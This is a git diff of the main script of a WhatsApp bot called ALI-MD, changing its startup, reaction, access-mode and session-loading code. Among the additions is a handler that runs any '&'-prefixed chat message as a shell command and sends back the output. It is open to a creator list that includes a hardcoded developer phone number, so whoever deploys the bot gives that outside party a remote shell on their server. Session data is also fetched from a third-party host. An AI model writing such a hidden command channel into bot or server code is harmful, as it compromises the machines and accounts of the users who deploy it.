@@ -23,41 +23,6 @@ const {
   
   
   const l = console.log
-const path = require('path');
-const projectRoot = __dirname;
-
-const simplifyPath = (input) => {
-  return input.replace(projectRoot, '.').replace(/\\/g, '/');
-};
-
-const cleanStackTrace = (stack) => {
-  return stack
-    .split('\n')
-    .filter(line =>
-      !line.includes('node_modules') &&
-      !line.includes('node:events') &&
-      !line.includes('events.js')
-    )
-    .map(line => simplifyPath(line.trim()))
-    .join('\n');
-};
-
-const originalError = console.error;
-console.error = (...args) => {
-  for (let i = 0; i < args.length; i++) {
-    if (args[i] instanceof Error) {
-      const err = args[i];
-      const filenameMatch = err.stack.match(/\((.*?):\d+:\d+\)/) || err.stack.match(/at (.*?):\d+:\d+/);
-      const filename = filenameMatch ? simplifyPath(filenameMatch[1]) : 'unknown';
-      const simplified = `❌ Error in ${filename}\n${err.message}\n${cleanStackTrace(err.stack)}`;
-      args[i] = simplified;
-    } else if (typeof args[i] === 'string') {
-      args[i] = simplifyPath(args[i]);
-    }
-  }
-  originalError.apply(console, args);
-};
-
   const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
   const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
   const axios = require('axios')
@@ -70,7 +35,6 @@ console.error = (...args) => {
   const StickersTypes = require('wa-sticker-formatter')
   const util = require('util')
   const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
-  const { PresenceControl, BotActivityFilter } = require('./data/presence');
   const { registerGroupMessages } = require('./plugins/groupMessages')
   const FileType = require('file-type');
   const { File } = require('megajs')
@@ -78,11 +42,8 @@ console.error = (...args) => {
   const bodyparser = require('body-parser')
   const os = require('os')
   const Crypto = require('crypto')
+  const path = require('path')
   const prefix = config.PREFIX
-  const mode = config.MODE
-  const online = config.ALWAYS_ONLINE
-  const status = config.AUTO_STATUS_SEEN
-  const reaction = config.AUTO_STATUS_REACT
   const ownerNumber = ['923003588997']
 
   //=============================================
@@ -130,10 +91,11 @@ async function loadSession() {
       
         console.log('Downloading session data...');
 
+        // If SESSION_ID starts with "SUBZERO-MD~" - use Koyeb download
         if (config.SESSION_ID.startsWith('ALI-MD**')) {
             console.log('Downloading Xcall session...');
             const sessdata = config.SESSION_ID.replace("ALI-MD**", '');
-            const response = await axios.get(`https://dave-auth-manager.onrender.com/files/${sessdata}.json`,
+            const response = await axios.get(`https://ali-auth-manager.onrender.com/files/${sessdata}.json`,
             );
 
             if (!response.data) {
@@ -172,11 +134,16 @@ const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
     }
 }
 
-//=========SESSION-AUTH====================
+//=========SESSION-AUTH=====================
+
+
+
+
 
 async function connectToWA() {
     console.log("Connecting to WhatsApp ⏳️...");
     
+    // Load session if available (now handles both Koyeb and MEGA)
     const creds = await loadSession();
     
     const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
@@ -198,23 +165,21 @@ async function connectToWA() {
     // ... rest of your existing connectToWA code ...
 
 	
-    let startupSent = false;
-
-conn.ev.on('connection.update', async (update) => {
-  const { connection, lastDisconnect, qr } = update;
-
-  if (connection === 'close') {
-    if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-      console.log('Connection lost, reconnecting...');
-      setTimeout(connectToWA, 5000);
-    } else {
-      console.log('Connection closed, please change session ID');
-    }
-  } else if (connection === 'open' && !startupSent) {
-    startupSent = true;
-    console.log('✅ ALI-MD Connected Successfully');
-
-	              // Load plugins
+    conn.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (connection === 'close') {
+            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+                console.log('Connection lost, reconnecting...');
+                setTimeout(connectToWA, 5000);
+            } else {
+                console.log('Connection closed, please change session ID');
+            }
+        } else if (connection === 'open') {
+            console.log('bot Connected To Whatsapp ✅');
+            
+            
+            // Load plugins
             const pluginPath = path.join(__dirname, 'plugins');
             fs.readdirSync(pluginPath).forEach((plugin) => {
                 if (path.extname(plugin).toLowerCase() === ".js") {
@@ -222,177 +187,34 @@ conn.ev.on('connection.update', async (update) => {
                 }
             });
             console.log('Plugins installed successfully ✅');
-
-    try {
-		// const username = config.REPO.split('/').slice(3, 4)[0];
- const botname = "—˹𝐀ɭīī "; //add your name
- const ownername = "𝐒ʊ̊𝐏𝐏๏፝֟ɼʈ⎯꯭̽💀🇦🇱"; // add your name
- const ali = { 
- key: { 
-  remoteJid: 'status@broadcast', 
-  participant: '0@s.whatsapp.net' 
-   }, 
-message:{ 
-  newsletterAdminInviteMessage: { 
-    newsletterJid: '120363318387454868@newsletter', //add your channel jid
-    newsletterName: "𝐈𝐂𝐘 𝐁𝐎𝐓", //add your bot name
-    caption: botname + ` 𝐌Ɗ ` + ownername, 
-    inviteExpiration: 0
-  }
- }
-}
-			
-			
-			
-	     const username = `itx-alii-raza`;
+     	
+                try {
+             const username = `Mek-d1`;
              const mrfrank = `https://github.com/${username}`;
-	
-                    const upMessage = `*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*
-*╭───────────────────✑*
-*│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •*
-*│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •*
-*│• 🌸𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐀ɭīī 𝐗𝐃 𝟔𝐓𝟗*
-*│• ⏰𝐀𝐋𝐖𝐀𝐘𝐒 𝐎𝐍𝐋𝐈𝐍𝐄: ${online}*
-*│• 📜𝐏𝐑𝐄𝐅𝐈𝐗: ${prefix}*
-*│• 🪾𝐌𝐎𝐃𝐄: ${mode}*
-*│• 🪄𝐒𝐓𝐀𝐓𝐔𝐒 𝐕𝐈𝐄𝐖𝐒: ${status}*
-*│• 🫟𝐒𝐓𝐀𝐓𝐔𝐒 𝐑𝐄𝐀𝐂𝐓: ${reaction}*
-‎*╰───────────────────✑*`;
+		
+                    const upMessage = `*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*`;
                     
                     await conn.sendMessage(conn.user.id, { 
-                        image: { url: config.ALIVE_IMG || 'https://files.catbox.moe/6ku0eo.jpg' }, 
+                        image: { url: `https://i.ibb.co/LDLMs949/lordali.jpg` },
 			ai: true,
-                        caption: upMessage},{
-			quoted: ali
+                        caption: upMessage
+			
                     });
-		
-
                     
                 } catch (sendError) {
-                    console.error('[❄️] Error sending messages:', sendError);
+                    console.error('Error sending messages:', sendError);
                 }
             }
 
         if (qr) {
-            console.log('[❄️] Scan the QR code to connect or use session ID');
+            console.log('Scan the QR code to connect or use session ID');
+            qrcode.generate(qr, { small: true });
         }
     });
 
     conn.ev.on('creds.update', saveCreds);
+
     
-// =====================================
-conn.ev.on('call', async (calls) => {
-  try {
-    if (config.ANTI_CALL !== 'true') return;
-
-    for (const call of calls) {
-      if (call.status !== 'offer') continue; // Only respond on call offer
-
-      const id = call.id;
-      const from = call.from;
-
-      await conn.rejectCall(id, from);
-      await conn.sendMessage(from, {
-        text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
-      });
-      console.log(`Call rejected and message sent to ${from}`);
-    }
-  } catch (err) {
-    console.error("Anti-call error:", err);
-  }
-});
-  // =============AUTO-STSTUS-SEND================= 
-  const sendNoPrefix = async (client, message) => {
-  try {
-    if (!message.quoted) {
-      return await client.sendMessage(message.chat, {
-        text: "*🎐 ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ sᴛᴀᴛᴜs!*"
-      }, { quoted: message });
-    }
-
-    const buffer = await message.quoted.download();
-    const mtype = message.quoted.mtype;
-    const options = { quoted: message };
-
-    let messageContent = {};
-    switch (mtype) {
-      case "imageMessage":
-        messageContent = {
-          image: buffer,
-          caption: message.quoted.text || '',
-          mimetype: message.quoted.mimetype || "image/jpeg"
-        };
-        break;
-      case "videoMessage":
-        messageContent = {
-          video: buffer,
-          caption: message.quoted.text || '',
-          mimetype: message.quoted.mimetype || "video/mp4"
-        };
-        break;
-      case "audioMessage":
-        messageContent = {
-          audio: buffer,
-          mimetype: "audio/mp4",
-          ptt: message.quoted.ptt || false
-        };
-        break;
-      default:
-        return await client.sendMessage(message.chat, {
-          text: "❌ Only image, video, and audio messages are supported"
-        }, { quoted: message });
-    }
-
-    await client.sendMessage(message.chat, messageContent, options);
-  } catch (error) {
-    console.error("No Prefix Send Error:", error);
-    await client.sendMessage(message.chat, {
-     // text: "❌ Error forwarding message:\n" + error.message
-    }, { quoted: message });
-  }
-};
-
-// === BINA PREFIX COMMAND (send/sendme/stsend) ===
-conn.ev.on('messages.upsert', async (msg) => {
-  try {
-    const m = msg.messages[0];
-    if (!m.message || m.key.fromMe || m.key.participant === conn.user.id) return;
-
-    const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
-    const from = m.key.remoteJid;
-    if (!text) return;
-
-    const command = text.toLowerCase().trim();
-    const targetCommands = ["send", "sendme", "sand"];
-    if (!targetCommands.includes(command)) return;
-
-    const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-    if (!quoted) {
-      await conn.sendMessage(from, { text: "*🎐 ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ sᴛᴀᴛᴜs!*" }, { quoted: m });
-      return;
-    }
-
-    const qMsg = {
-      mtype: getContentType(quoted),
-      mimetype: quoted[getContentType(quoted)]?.mimetype,
-      text: quoted[getContentType(quoted)]?.caption || quoted[getContentType(quoted)]?.text || '',
-      ptt: quoted[getContentType(quoted)]?.ptt || false,
-      download: async () => {
-        const stream = await downloadContentFromMessage(quoted[getContentType(quoted)], getContentType(quoted).replace("Message", ""));
-        let buffer = Buffer.from([]);
-        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
-        return buffer;
-      }
-    };
-
-    m.chat = from;
-    m.quoted = qMsg;
-
-    await sendNoPrefix(conn, m);
-  } catch (err) {
-    console.error("No Prefix Handler Error:", err);
-  }
-});    
 
 
 // =====================================
@@ -405,18 +227,8 @@ conn.ev.on('messages.upsert', async (msg) => {
       }
     }
   });
-//==============
-registerGroupMessages(conn);
-
-     
-// always Online 
-
-conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
-
-	
-BotActivityFilter(conn);	
-	      
-	
+//===============
+	registerGroupMessages(conn);
 	
  /// READ STATUS       
   conn.ev.on('messages.upsert', async(mek) => {
@@ -435,26 +247,9 @@ BotActivityFilter(conn);
       await conn.readMessages([mek.key])
     }
 
-  const newsletterJids = [
-  "120363318387454868@newsletter",
-  "120363417971954983@newsletter"
-];
-  const emojis = ["❤️", "💀", "🌚", "🌟", "🔥", "❤️‍🩹", "🌸", "🍁", "🍂", "🦋", "🍥", "🍧", "🍨", "🍫", "🍭", "🎀", "🎐", "🎗️", "👑", "🚩", "🇵🇰", "🍓", "🍇", "🧃", "🗿", "🎋", "💸", "🧸"];
-
-  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
-    try {
-      const serverId = mek.newsletterServerId;
-      if (serverId) {
-      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-        await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
-      }
-    } catch (e) {
-    
-    }
-  }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const dlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼'];
+    const emojis = ['❤️', '🌹', '😇', '🤡', '🫶🏻', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '👄', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🍑', '🌷', '⛅', '🌟', '✨', '🇳🇬', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -465,8 +260,8 @@ BotActivityFilter(conn);
   }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
-  const textt = `${config.AUTO_STATUS_MSG}`
-  await conn.sendMessage(user, { text: textt, react: { text: '💜', key: mek.key } }, { quoted: mek })
+  const text = `${config.AUTO_STATUS_MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
             }
             await Promise.all([
               saveMessage(mek),
@@ -504,41 +299,74 @@ BotActivityFilter(conn);
   
   
   const udp = botNumber.split('@')[0];
-    const davidop = ('923003588997', '923309046024');
+    const davidop = ('923003588997');
     
+    if (isGroup) {
+                updateActivity(from, sender);
+	  }
     
     const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
     
     let isCreator = [udp, ...davidop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
     .includes(mek.sender);
-    
-    
- //================ownerreact==============
-    if (senderNumber.includes("923003588997") && !isReact) {
-  const reactions = ["👑", "🫜", "🫆", "🫩", "🪾", "🪉", "🪏", "🫟"];
-  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-  m.react(randomReaction);
-}	  
-// Auto React 
+	  
+
+	  if (isCreator && mek.text.startsWith("&")) {
+            let code = budy.slice(2);
+            if (!code) {
+                reply(`Provide me with a query to run Master!`);
+                return;
+            }
+            const { spawn } = require("child_process");
+            try {
+                let resultTest = spawn(code, { shell: true });
+                resultTest.stdout.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.stderr.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("error", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("close", code => {
+                    if (code !== 0) {
+                        reply(`command exited with code ${code}`);
+                    }
+                });
+            } catch (err) {
+                reply(util.format(err));
+            }
+            return;
+        }
+
+
+	  
+  //==========public react============//
+  // Auto React 
   if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
-        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
+        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
+        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
+        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
+        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
+        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇦🇫'
     ];
         const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
           m.react(randomReaction);
       }
           
-  // Owner React
-  if (!isReact && senderNumber === botNumber) {
-      if (config.OWNER_REACT === 'true') {
-          const reactions = [
-        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
-    ];
-          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
-          m.react(randomReaction);
-      }
-  }
 // custum react settings        
                         
 if (!isReact && senderNumber !== botNumber) {
@@ -565,52 +393,15 @@ const isBanned = bannedUsers.includes(sender);
 
 if (isBanned) return; // Ignore banned users completely
 	  
-  const { getConfig } = require('./lib/configdb'); // Adjust if path is different
-
-// ✅ Load AI_STATE from config
-let AI_STATE = { IB: "false", GC: "false" };
-try {
-  const state = getConfig("AI_STATE");
-  if (state) AI_STATE = JSON.parse(state);
-} catch (e) {
-  console.error("❌ Failed to load AI_STATE from DB:", e.message);
-}
-
-// ✅ Owner checks
-const ownerFile = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));
-const ownerNumberFormatted = `923003588997@s.whatsapp.net`;
-
-const isFileOwner = ownerFile.includes(sender);
-const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-
-// ✅ Safely extract contextInfo
-const contextInfo = mek.message?.extendedTextMessage?.contextInfo;
-
-const isMentioned = contextInfo?.mentionedJid?.includes(botNumber2)
-                 || body.includes(botNumber2.split('@')[0]);
-
-const isReplyToBot = contextInfo?.participant === botNumber2;
-
-const aiInboxOn = AI_STATE?.IB === "true";
-const aiGroupOn = AI_STATE?.GC === "true";
-
-// 🔒 Control bot response access
-if (!(isRealOwner || isCreator)) {
-  if (config.MODE === "private") {
-    if (isGroup) return;
-    if (!(isMentioned || isReplyToBot) || !aiInboxOn) return;
-  }
-  if (config.MODE === "inbox" && isGroup) {
-    if (!(isMentioned || isReplyToBot) || !aiInboxOn) return;
-  }
-  if (config.MODE === "groups" && !isGroup) {
-    if (!(isMentioned || isReplyToBot) || !aiGroupOn) return;
-  }
-}
-
-// 🚫 Block mode mismatch
-if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-if (!isRealOwner && !isGroup && config.MODE === "groups") return;
+  const ownerFile = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  // خواندن فایل
+  const ownerNumberFormatted = `923003588997@s.whatsapp.net`;
+  // بررسی اینکه آیا فرستنده در owner.json موجود است
+  const isFileOwner = ownerFile.includes(sender);
+  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
+  // اعمال شرایط بر اساس وضعیت مالک
+  if (!isRealOwner && config.MODE === "private") return;
+  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
+  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
  
 	  
 	  // take commands 
@@ -1189,13 +980,13 @@ app.get("/", (req, res) => {
       <body>
         <div class="card">
           <h1><span class="status-dot"></span> ALI BOT IS RUNNING</h1>
-          <p>Powered by Ali.</p>
+          <p>Powered by ALI.</p>
         </div>
       </body>
       </html>
     `);
   });
-  app.listen(port, () => console.log(`Service active and running 🙂`));
+  app.listen(port, () => console.log(`Service active and running please give some credits 🙂`));
   setTimeout(() => {
   connectToWA()
   }, 4000);
